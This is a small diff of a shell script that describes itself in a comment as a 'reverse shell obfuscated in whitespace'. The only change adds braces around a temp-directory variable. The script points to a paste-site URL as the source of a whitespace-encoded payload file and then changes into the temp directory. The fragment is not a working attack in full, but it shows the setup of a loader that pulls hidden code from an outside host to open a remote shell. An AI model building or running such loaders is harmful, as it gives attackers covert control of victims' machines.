@@ -1,7 +1,7 @@
 #!/bin/sh
 #reverse shell obfuscated in whitspace
 
-FILE="$TMPDIR/file.ws"
+FILE="${TMPDIR}/file.ws"
 WHITE="https://paste.c-net.org/UnplugDominant"
 
 cd "$TMPDIR"
